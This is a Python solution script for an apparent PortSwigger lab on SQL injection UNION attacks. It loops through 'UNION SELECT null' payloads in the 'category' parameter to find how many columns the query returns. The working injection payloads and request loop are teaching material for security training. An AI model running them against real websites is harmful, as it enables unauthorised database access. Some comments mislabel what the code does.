#########################################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 16/9/2023
#
# Lab: SQL injection UNION attack, determining the number of columns returned
#      by the query
#
# Steps: 1. Inject payload into 'category' query parameter to determine
#           the number of columns
#        2. Add one additional null column at a time
#        3. Repeat this process, increasing the number of columns until you
#           receive a valid response
#
#########################################################################################

###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########
# change this url to your lab
url = "https://0a7c00b003c091988041c121006a00b7.web-security-academy.net"
print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
for i in range(1, 10):
    try:
        # number of nulls
        nulls = "null, " * i
        # payload to determine the number of columns
        payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -")
        print(Fore.WHITE + f"[*] Trying payload: {payload}")
        # fetch the page with the injected payload
        null_injection = requests.get(
            f"{url}/filter?category={payload}")
        # extract the name of users table
        internal_error = re.findall("<h4>Internal Server Error</h4>",
                                    null_injection.text)
        if len(internal_error) == 0:
            print(Fore.WHITE + "[#] Number of columns: " + Fore.GREEN + str(i))
            print(
                Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
            break
        else:
            continue
    except:
        print(Fore.RED +
              "[!] Failed to inject the payload to retrieve the name of users table through exception")
